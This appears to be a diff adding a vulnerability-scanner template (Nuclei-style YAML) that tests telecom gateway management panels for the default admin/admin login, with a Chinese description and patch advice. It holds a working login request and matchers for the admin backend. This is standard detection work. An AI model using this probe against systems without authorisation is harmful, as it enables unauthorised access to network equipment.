@@ -1,0 +1,39 @@
+id: telecom-gateway-default-login
+info:
+  name: Telecom Gateway Default Login
+  author:
+  - l0ne1y
+  description: |-
+    电信网关配置管理系统弱口令
+    电信网关配置管理系统存在默认弱口令，导致攻击者可利用admin/admin用户密码进入后台，进而对系统以及数据安全造成威胁。
+  severity: high
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - <title>电信网关服务器管理后台</title>
+    - index-shang.php
+    - di.php
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  raw:
+  - |
+    POST /manager/login.php HTTP/1.1
+    Host: {{Hostname}}
+
+    Name={{username}}&Pass={{password}}
+  attack: pitchfork
+  payloads:
+    password:
+    - admin
+    username:
+    - admin
+  max-redirects: 2
+  redirects: true
